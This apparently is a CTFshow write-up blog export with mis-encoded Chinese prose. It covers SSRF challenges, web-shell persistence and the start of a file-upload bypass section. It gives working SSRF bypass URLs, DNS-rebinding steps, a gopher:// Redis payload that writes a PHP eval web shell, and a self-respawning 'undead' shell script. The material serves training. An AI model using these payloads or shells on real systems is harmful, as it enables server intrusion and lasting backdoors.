<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
<span class="meta">?&gt;</span> hacker</code></pre>

<pre><code class="highlight plaintext">parse_urlè¿™ä¸ªæ˜¯ç”¨æ¥å¤„ç†URLçš„ï¼ŒæŠŠå®ƒè§£ææˆå„ä¸ªéƒ¨åˆ†åå­˜å‚¨åˆ°æ•°ç»„é‡Œé¢
å¹¶ä¸”è¦æ±‚å¤´ä¸ºhttp/https
é—®é¢˜æ¥äº†å®ƒè¿™ä¸ªæ­£åˆ™å†™çš„ä¸€æ‹“å®ï¼Œæ²¡wafä¸€æ ·</code></pre>

<p><code>flag.php</code>ä¸€å¦‚æ—¢å¾€çš„éæœ¬åœ°æ— æ³•è®¿é—®,ç›´æ¥åŠ ä¸ªå¤´å°±è¡Œ</p>
<pre><code class="highlight plaintext">http://127.0.0.1/flag.php</code></pre>

<h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\ã€‚/i&#x27;</span>, <span class="variable">$url</span>))&#123;
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
<span class="meta">?&gt;</span> hacker</code></pre>

<p>å¯¹å‘³</p>
<p>é‚£æˆ‘è¦ç”¨é‚ªé—¨ä¸€ç‚¹çš„æ–¹å¼æ¥ç»•è¿‡äº†</p>
<pre><code class="highlight plaintext">http://127.1/flag.php</code></pre>

<p>å¯¹äºå½¢å¼è¿™æ ·çš„ip<code>x.0.0.1</code>å¯ä»¥ç›´æ¥ç¼©å†™ä¸º<code>x.1</code></p>
<p>åŒæ—¶ä¹Ÿå¯ä»¥è¿›åˆ¶æ›¿æ¢</p>
<pre><code class="highlight plaintext">127.0.0.0/8æ˜¯ä¸€ä¸ªç¯å›åœ°å€ç½‘æ®µï¼Œä»127.0.0.1 ~ 127.255.255.254éƒ½è¡¨ç¤ºlocalhost
ä¹Ÿå°±æ˜¯è¯´http://127.1.1.1/flag.phpå…¶å®ä¹Ÿå¯ä»¥çš„</code></pre>

<h3 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|ã€‚/i&#x27;</span>, <span class="variable">$url</span>))&#123;
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>è¿™é‡Œä¸»è¦çš„æ•°å­—éƒ½wafäº†</p>
<p>é‚£ä¹ˆå¯ä»¥æœ‰ä¸‹é¢å‡ ç§æƒ³æ³•:</p>
<pre><code class="highlight plaintext">åŸŸåæŒ‡å‘127
302è·³è½¬
DNS-Rebinding</code></pre>

<ul>
<li><ol>
<li>åœ¨è‡ªå·±çš„åŸŸåé‡Œæ·»åŠ ä¸€æ¡Aè®°å½•æŒ‡å‘<code>127.0.0.1</code></li>
</ol>
</li>
<li><ol start="2">
<li>åœ¨è‡ªå·±çš„ç½‘ç«™é¡µé¢æ·»åŠ </li>
</ol>
</li>
<li><ol start="3">
<li>è‡ªå·±å»ceye.ioæ³¨å†Œç»‘å®š<code>127.0.0.1</code>ç„¶åè®°å¾—å‰é¢åŠ r</li>
</ol>
</li>
</ul>
<pre><code class="highlight plaintext">url=http://r.xxxzc8.ceye.io/flag.php</code></pre>

<h3 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];
<span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>å°†ä¸»æœºåé™åˆ¶åˆ°5ä½ä»¥å†…ï¼Œé‚£ç”¨ç¼©å†™æ ¼å¼å°±è¡Œ</p>
<p><code>127.1æˆ–è€…0(å…¶å®å°±æ˜¯0.0.0.0)</code></p>
<h3 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];
<span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>é™åˆ¶åˆ°3ä½ä»¥å†…ï¼Œ127ç”¨ä¸äº†äº†0å¯ä»¥</p>
<h3 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);
<span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;
<span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;
    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);
&#125;


<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>ä¸æ˜¯å¾ˆæ‡‚ã€‚ã€‚</p>
<pre><code class="highlight plaintext">gethostbyname:æˆåŠŸæ—¶è¿”å› IPv4 åœ°å€ï¼Œå¤±è´¥æ—¶è¿”å›ä¸»æœºåã€‚
filter_var() å‡½æ•°é€šè¿‡æŒ‡å®šçš„è¿‡æ»¤å™¨è¿‡æ»¤ä¸€ä¸ªå˜é‡ã€‚
FILTER_FLAG_IPV4 - è¦æ±‚å€¼æ˜¯åˆæ³•çš„ IPv4 IPï¼ˆæ¯”å¦‚ 255.255.255.255ï¼‰ã€‚
FILTER_FLAG_IPV6 - è¦æ±‚å€¼æ˜¯åˆæ³•çš„ IPv6 IPï¼ˆæ¯”å¦‚ 2001:0db8:85a3:08d3:1319:8a2e:0370:7334ï¼‰ã€‚
FILTER_FLAG_NO_PRIV_RANGE - è¦æ±‚å€¼ä¸åœ¨ RFC æŒ‡å®šçš„ç§æœ‰èŒƒå›´ IP å†…ï¼ˆæ¯”å¦‚ 192.168.0.1ï¼‰ã€‚
FILTER_FLAG_NO_RES_RANGE - è¦æ±‚å€¼ä¸åœ¨ä¿ç•™çš„ IP èŒƒå›´å†…ã€‚è¯¥æ ‡å¿—æ¥å— IPV4 å’Œ IPV6 å€¼ã€‚</code></pre>

<p>ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œä¼šéªŒè¯URLçš„IPåœ°å€ä¸åœ¨RFCæŒ‡å®šçš„<code>ç§æœ‰IP</code>èŒƒå›´å†…ï¼ˆæ¯”å¦‚ 192.168.0.1ï¼‰ï¼Œä¸”è¦æ±‚å€¼ä¸åœ¨<code>ä¿ç•™çš„IP</code>èŒƒå›´å†…ã€‚</p>
<p>ä½¿ç”¨DNSé‡ç»‘å®šæˆ–è€…ç”¨è‡ªå·±çš„æœåŠ¡å™¨æ‰“302</p>
<p>è¿™é‡Œå¯ä»¥ç”¨ç¬¬ä¸€ä¸ªï¼Œå› ä¸ºæœ‰ä¸ªå¿«æ·çš„ç½‘ç«™</p>
<pre><code class="highlight plaintext">https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg</code></pre>

<p>å¯ä»¥ç›´æ¥é‡ç»‘å®šï¼Œä½ è¾“ä¸€ä¸ªä¸ä¼šè§¦å‘å†…ç½‘ipéªŒè¯çš„å°±å¯ä»¥ï¼Œå‘åŒ…ä¸‰æ¬¡å°±å¯ä»¥æ‹¿åˆ°flag</p>
<pre><code class="highlight plaintext">åˆ†åˆ«æ˜¯:127.0.0.1 ip!
1.1.1.1ï¼ˆæˆ‘é‡ç»‘å®šçš„ip
1.1.1.1 flag</code></pre>

<p>ä¸ºä»€ä¹ˆæ˜¯ä¸‰æ¬¡?æˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œè°ƒè¯•ä¸€ä¸‹çœ‹çœ‹å¥½äº†</p>
<p>ä½†æ˜¯æ€ªå°±æ€ªåœ¨æˆ‘è‡ªå·±è°ƒæ˜¯åªæœ‰çˆ†ipçš„ï¼Œå‡ºä¸æ¥ã€‚ã€‚</p>
<h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;
    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);
&#125;</code></pre>

<p>è¦ç”¨<code>http://ctf</code>å¼€å¤´<code>show</code>ç»“å°¾</p>
<p>è¿™é‡Œåˆ©ç”¨@</p>
<pre><code class="highlight plaintext">åœ¨URLä¸­ï¼Œ@ç¬¦å·é€šå¸¸ç”¨äºåœ¨åŸºæœ¬è®¤è¯ï¼ˆBasic Authenticationï¼‰ä¸­ï¼Œå°†ç”¨æˆ·åå’Œå¯†ç åŒ…å«åœ¨URLä¸­ã€‚è¿™ç§ç”¨æ³•çš„æ ¼å¼æ˜¯ï¼š
http://username:password@hostname/path
åœ¨è¿™ä¸ªæ ¼å¼ä¸­ï¼Œusername:password æ˜¯ç™»å½•æ‰€éœ€çš„å‡­æ®ï¼Œ@ ç¬¦å·ç”¨æ¥åˆ†éš”å‡­æ®å’Œä¸»æœºåã€‚ç„¶è€Œï¼Œè¿™ç§åšæ³•åœ¨ç°ä»£ç½‘ç»œåº”ç”¨ä¸­ä¸æ¨èä½¿ç”¨ï¼Œå› ä¸ºå®ƒå®¹æ˜“å¯¼è‡´å®‰å…¨é—®é¢˜ï¼Œæ¯”å¦‚æ³„éœ²ç”¨æˆ·å‡­æ®ã€‚</code></pre>

<pre><code class="highlight plaintext">POC:
url=http://ctf.com@127.0.0.1/flag.php#show
url=http://ctf.com@127.0.0.1/flag.php?show</code></pre>

<h3 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h3><pre><code class="highlight plaintext">æ‰“æ— å¯†ç çš„mysql</code></pre>

<p>éšä¾¿è¾“ä¸€ä¸‹è½¬åˆ°<code>check.php</code></p>
<p>çœ‹åˆ°<code>POST:returl=https://404.chall.ctf.show/&amp;u=admin</code></p>
<p>é‚£çœ‹æ¥è¿™è¾¹å¯ä»¥å†™é©¬å‘gopheråŒ…äº†</p>
<p>è¿™é‡Œä»‹ç»ä¸€ä¸ªå·¥å…·<code>gopherus</code><a href="https://github.com/tarunkant/Gopherus.git">https://github.com/tarunkant/Gopherus.git</a></p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250710143949440.png" alt="image-20250710143949440"></p>
<p><code>_</code>åé¢çš„éƒ¨åˆ†è®°å¾—äºŒæ¬¡URLç¼–ç (å› ä¸ºå‘é€è¿‡å»æ—¶ä¼šè¢«ç¼–ç ä¸€æ¬¡)</p>
<p>å†™å…¥æˆåŠŸç›´æ¥è¿å³å¯</p>
<h3 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
<span class="meta">?&gt;</span></code></pre>

<p>çœ‹ä¼¼å¹³å¹³æ— å¥‡ï¼Œå®åˆ™æš—è—æ€æœºã€‚ã€‚</p>
<p><code>file://</code>åè®®è¯»ä¸å‡ºä¸œè¥¿</p>
<p>å°è¯•ç”¨<code>dict://</code>æ¢æµ‹ä¸€ä¸‹ç«¯å£</p>
<p>æœ€åå‘ç°redisçš„ç«¯å£æ˜¯å¼€æ”¾çš„</p>
<pre><code class="highlight plaintext">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5Bcmd%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code></pre>

<p>è®°å¾—æŠŠ<code>_</code>åè¾¹ç¼–ç </p>
<p>æ¥ç€POSTä¸€ä¸‹ï¼Œè¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆPOSTä¼šå¡ä½ç„¶åæŠ¥é”™504</p>
<p>ä½†æ˜¯shell.phpæ˜¯å­˜åœ¨çš„ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆå•Šã€‚ã€‚å¸Œæœ›æœ‰å¤§ä½¬å¯ä»¥è§£ç­”ä¸€ä¸‹</p>
<p>æœ€åç›´æ¥å‘½ä»¤æ‰§è¡Œå³å¯ï¼Œå–œæ¬¢èšå‰‘ä¹Ÿå¯ä»¥</p>
<h2 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h2><h3 id="web670"><a href="#web670" class="headerlink" title="web670"></a>web670</h3><pre><code class="highlight plaintext">system(&#x27;echo &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot; &gt;shell.php&#x27;);
var_dump(getcwd()); =&gt;/var/www/html</code></pre>

<p>ä¹‹åå‘ç°æ— æ³•è¿ä¸Š</p>
<p><code>cmd=system(&quot;tac shell.php&quot;);</code>ä¸€çœ‹æ²¡æœ‰å†…å®¹å•Šã€‚ã€‚</p>
<p>çœ‹äº†ä¸‹å…¶ä»–å¸ˆå‚…çš„åšå®¢æ„Ÿè§‰æˆ‘æ€è·¯é”™äº†ï¼Œè¿™é‡Œæ˜¯ç”¨<code>file_put_contents</code>æ¥æ‰§è¡Œ</p>
<pre><code class="highlight plaintext">cmd=file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;);
åœ¨æºç é‡Œå¯ä»¥çœ‹åˆ°æˆåŠŸå†™å…¥</code></pre>

<p>ä½†æ˜¯è¿ä¸ä¸Šå•Šã€‚ã€‚åæ¥æ‰¾äº†åŸå› å‘ç°è¦åœ¨èšå‰‘é‡Œè®¾ç½®å¿½ç•¥httpsè¯ä¹¦</p>
<p>ç„¶åcheckå‘ç°æŠŠç›®å½•æ¸…å…‰äº†ã€‚ã€‚</p>
<p>è‰æ‹Ÿå—ä¸æ­»é©¬ï¼Œæ¥</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);
    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);
    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);
    <span class="variable">$file</span> = <span class="string">&#x27;shell.php&#x27;</span>;
    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>;
    <span class="keyword">while</span> (<span class="number">1</span>) &#123;
        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>);
        <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);
    &#125;
<span class="meta">?&gt;</span></code></pre>

<pre><code class="highlight php"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;17.php&#x27;</span>, <span class="string">&#x27;&lt;?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = \&#x27;shell.php\&#x27;;$code = \&#x27;&lt;?php @eval($_POST[1]);?&gt;\&#x27;;while (1) &#123;file_put_contents($file, $code);usleep(5000);&#125;?&gt;&#x27;</span>);</code></pre>

<p>è§£æä¸€ä¸‹</p>
<pre><code class="highlight plaintext">set_time_limit()å‡½æ•°ï¼šè®¾ç½®å…è®¸è„šæœ¬è¿è¡Œçš„æ—¶é—´ï¼Œå•ä½ä¸ºç§’ï¼ˆå¦‚æœè®¾ç½®è¯¥è¿è¡Œæ—¶é—´ï¼Œsleep()å‡½æ•°åœ¨æ‰§è¡Œç¨‹åºæ—¶çš„æŒç»­æ—¶é—´å°†ä¼šè¢«å¿½ç•¥æ‰ï¼‰
ignore_user_abort()å‡½æ•°ï¼šå‡½æ•°è®¾ç½®ä¸å®¢æˆ·æœºæ–­å¼€æ˜¯å¦ä¼šç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œï¼ˆå¦‚æœè®¾ç½®ä¸ºTrueæˆ–è€…1ï¼Œåˆ™å¿½ç•¥ä¸ç”¨æˆ·çš„æ–­å¼€ï¼‰
unlink(FILE)å‡½æ•°ï¼šåˆ é™¤æ–‡ä»¶ï¼ˆé˜²æ­¢æ–‡ä»¶è½åœ°è¢«æ£€æµ‹å·¥å…·æŸ¥æ€ï¼‰
file_put_contentså‡½æ•°ï¼šå°†ä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥è¯¥æ–‡ä»¶ä¸­
usleepå‡½æ•°ï¼šå»¶è¿Ÿæ‰§è¡Œå½“å‰è„šæœ¬æ•°å¾®ç§’ï¼Œå³æ¡ä»¶ç«äº‰</code></pre>

]]></content>
      <tags>
        <tag>-Web -CTF -WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ æ¼æ´</title>
    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´</h1><p>å¤§éƒ¨åˆ†æ˜¯éœ€è¦å›æ˜¾å‚¨å­˜è·¯å¾„æ‰èƒ½æ‰“åç»­æ“ä½œçš„ï¼Œå¦‚æœæ²¡æœ‰å›æ˜¾è·¯å¾„è¦ä¸å†æƒ³æƒ³ã€‚ï¼Ÿ(é›¾)</p>
<h2 id="å‰ç«¯æ£€æµ‹"><a href="#å‰ç«¯æ£€æµ‹" class="headerlink" title="å‰ç«¯æ£€æµ‹"></a>å‰ç«¯æ£€æµ‹</h2><p>å‰ç«¯æ£€æµ‹ä¸Šä¼ æ–‡ä»¶çš„åç¼€ï¼Œjsæ£€æµ‹ç›´æ¥ç¦ç”¨js</p>
<h2 id="åç«¯æ£€æµ‹"><a href="#åç«¯æ£€æµ‹" class="headerlink" title="åç«¯æ£€æµ‹"></a>åç«¯æ£€æµ‹</h2><h3 id="æ£€æµ‹content-type"><a href="#æ£€æµ‹content-type" class="headerlink" title="æ£€æµ‹content-type"></a>æ£€æµ‹content-type</h3><p>æ£€æµ‹ä½ å‘åŒ…çš„Content-Typeå‚æ•°æ¥åˆ¤æ–­æ–‡ä»¶ä¸Šä¼ ç±»å‹</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416151018927.png" alt="image-20250416151018927"></p>
<p>ä¸€èˆ¬ä½ æ”¹ä¸€ä¸‹content-typeå°±å¯ä»¥ç»•è¿‡äº†</p>
<h3 id="æ£€æµ‹æ–‡ä»¶å¤´åˆ¤æ–­æ–‡ä»¶ç±»å‹"><a href="#æ£€æµ‹æ–‡ä»¶å¤´åˆ¤æ–­æ–‡ä»¶ç±»å‹" class="headerlink" title="æ£€æµ‹æ–‡ä»¶å¤´åˆ¤æ–­æ–‡ä»¶ç±»å‹"></a>æ£€æµ‹æ–‡ä»¶å¤´åˆ¤æ–­æ–‡ä»¶ç±»å‹</h3><p>å­—ä¹‰ï¼Œä½¿ç”¨getimagesize()å‡½æ•°æ¥è·å–æ–‡ä»¶çš„MIMEç±»å‹ï¼Œæ­¤æ—¶æ£€æµ‹çš„ä¸æ˜¯æ•°æ®åŒ…ä¸­çš„content-typeï¼Œè€Œæ˜¯æ–‡ä»¶å¤´</p>
<p>è¿™ç§æ—¶å€™ä¼ªé€ ä¸€ä¸‹å°±å¯ä»¥</p>
<pre><code class="highlight scss"><span class="built_in">gif</span>(GIF89a) : <span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span> 
jpgã€jpeg : FF D8 FF 
png : <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span> <span class="number">0</span>D <span class="number">0</span>A</code></pre>

